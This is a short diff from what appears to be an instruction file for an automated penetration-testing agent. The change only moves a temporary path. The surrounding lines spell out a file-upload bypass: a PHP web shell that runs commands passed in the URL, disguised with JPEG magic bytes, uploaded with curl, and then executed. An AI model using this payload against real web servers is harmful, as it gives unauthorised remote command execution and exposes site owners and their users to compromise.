@@ -56,9 +56,9 @@ Maximum 20 tool calls. Stop and report after 20 tool calls.
    # Add magic bytes + payload
    python3 -c "
    payload = b'\xff\xd8\xff' + b'<?php system(\$_GET[\"cmd\"]); ?>'
-   open('/tmp/shell.php.jpg','wb').write(payload)
+   open('/tmp/aurelinth/shell.php.jpg','wb').write(payload)
    "
-   curl -s -X POST "URL/upload" -F "file=@/tmp/shell.php.jpg"
+   curl -s -X POST "URL/upload" -F "file=@/tmp/aurelinth/shell.php.jpg"
 ```
 
 4. **Execute webshell** — once uploaded:
